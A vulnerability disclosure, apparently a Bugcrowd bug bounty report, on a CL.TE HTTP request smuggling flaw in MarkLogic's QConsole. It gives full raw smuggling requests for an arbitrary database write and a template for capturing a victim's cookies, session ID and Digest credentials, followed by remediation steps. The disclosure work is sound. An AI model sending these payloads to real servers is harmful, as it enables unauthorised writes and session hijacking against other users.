# Bug Report: HTTP Request Smuggling (CL.TE) Leading to Arbitrary File Write & Session Hijacking

## Summary

A HTTP Request Smuggling vulnerability (CL.TE) was identified in MarkLogic's QConsole interface. By sending a crafted request with conflicting `Content-Length` and `Transfer-Encoding` headers, an attacker can smuggle arbitrary backend requests, write files to the MarkLogic database, and hijack victim user sessions including their cookies and authentication headers.

---

## Vulnerability Details

|Field|Value|
|---|---|
|**Type**|HTTP Request Smuggling (CL.TE)|
|**Component**|MarkLogic QConsole (`/qconsole/`)|
|**Affected Endpoint**|`/qconsole/endpoints/explore-file.xqy`|
|**Authentication Required**|Yes (authenticated user)|
|**Tested On**|MarkLogic local instance (localhost:8000)|
|**CVSS Score**|8.1 (High)|
|**CVSS Vector**|`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N`|

---

## Root Cause

MarkLogic's HTTP layer processes requests with both `Content-Length` and `Transfer-Encoding: chunked` headers without rejecting or normalizing the conflict. This causes a desync between the frontend and backend parsers:

- **Frontend** uses `Content-Length: 5` → reads only 5 bytes of the body and forwards one request
- **Backend** uses `Transfer-Encoding: chunked` → reads the full chunked body and processes two requests

The leftover bytes from the smuggled request poison the backend's TCP connection buffer, causing the next incoming request (from any user) to be interpreted as a continuation of the attacker's smuggled request body.

---

## Steps to Reproduce

### PoC 1 — Arbitrary File Write

Send the following request in a single TCP connection:

```http
GET /qconsole/ HTTP/1.1
Host: localhost:8000
Authorization: Digest username="admin", realm="public", nonce="3f2ab8241d6be0:Al/XvYDF2MYMe7o0PLBX/w==", uri="/qconsole/", response="919af794a88040707131b7a0d5de4cf6", opaque="f8ecb2a5894fad99", qop=auth, nc=0000002c, cnonce="55872b574f8652ed"
Connection: keep-alive
Cookie: csrf-token-8000-=; csrf-token-8000-admin=412e90f271789a325f6ef52a71ef1b926fc0166ad8669ada6ab24093f9d8e59e; server-port=8000; username=admin; platform=linux; SessionID=73e554646a749278
Content-Length: 5
Transfer-Encoding: chunked

4c3
POST /qconsole/endpoints/explore-file.xqy?dbid=16263936617302361948&uri=Hacked&view-action=save&cache=1777991338558 HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded
X-CSRF-Token: ed1e603a9337ac54ac1321cff8ed418075fab32ea510d032a0965d229dace226
Content-Length: 11
Authorization: Digest username="admin", realm="public", nonce="3f2ab8241d6be0:Al/XvYDF2MYMe7o0PLBX/w==", uri="/qconsole/endpoints/explore-file.xqy?dbid=16263936617302361948&uri=Hacked&view-action=save&cache=1777991338558", response="fbc70153ba9ace8ec21351452846961d", opaque="f8ecb2a5894fad99", qop=auth, nc=00000103, cnonce="867da4b3036d30f6"
Connection: keep-alive
Cookie: csrf-token-8000-=; csrf-token-8000-admin=412e90f271789a325f6ef52a71ef1b926fc0166ad8669ada6ab24093f9d8e59e; server-port=8000; username=admin; platform=linux; SessionID=73e554646a749278

data=Hacked
0
```

**Observed Response:**

```http
HTTP/1.1 200 OK
Content-type: application/json; charset=utf-8
Server: MarkLogic

{"uri":"Hacked", "type":"application/x-unknown-content-type", "nodeKind":"text"}
```

The file with `uri=Hacked` and content `Hacked` was successfully written to the MarkLogic database without the victim initiating the action.

---

### PoC 2 — Victim Session Hijacking

By using a large `Content-Length` in the smuggled request body and ending with an open parameter, the next victim's HTTP request (including their cookies, session tokens, and auth headers) gets appended to the attacker's request body and stored/returned.

**Smuggled payload structure:**

```http
GET /qconsole/ HTTP/1.1
Host: localhost:8000
Content-Length: 5
Transfer-Encoding: chunked
[attacker auth & cookies]

<CHUNK_SIZE>
POST /qconsole/endpoints/explore-file.xqy?dbid=<DBID>&uri=captured&view-action=save HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 900
[attacker auth & cookies]

data=
0
```

**What happens:**

1. Backend sees the smuggled POST with `Content-Length: 900` and waits for 900 bytes
2. The next victim's request arrives and is appended after `data=`
3. The victim's full request — including `Cookie`, `SessionID`, `Authorization` headers — is saved to the MarkLogic DB as the file content
4. Attacker reads the captured data back via the file read endpoint
5. Attacker replays the victim's `SessionID` cookie to fully impersonate them

---

## Impact

|Impact|Description|
|---|---|
|**Session Hijacking**|Attacker can capture and replay victim session cookies to fully impersonate any user hitting the server|
|**Arbitrary File Write**|Attacker can write arbitrary content to the MarkLogic database under any URI|
|**Auth Header Capture**|Digest authentication credentials of victims are exposed|
|**CSRF Token Capture**|Victim CSRF tokens are captured, enabling further CSRF bypass|
|**Privilege Escalation**|If a higher-privileged user (e.g., admin) hits the server after the poison, their session can be hijacked|

---

## Recommended Remediation

1. **Reject ambiguous requests** — If both `Content-Length` and `Transfer-Encoding` headers are present, return a `400 Bad Request` and drop the connection
2. **Enforce chunked encoding priority** — If `Transfer-Encoding: chunked` is present, always ignore `Content-Length` per RFC 7230 Section 3.3.3
3. **Close connections after each request** in contexts where persistent connections are not strictly required
4. **Deploy a WAF rule** to detect and block requests containing both conflicting headers as a short-term mitigation

---

## References

- [PortSwigger: HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [RFC 7230 Section 3.3.3 — Message Body Length](https://tools.ietf.org/html/rfc7230#section-3.3.3)
- [CWE-444: Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)

---

_Report generated for Progress Software — MarkLogic Bug Bounty Engagement (Bugcrowd)_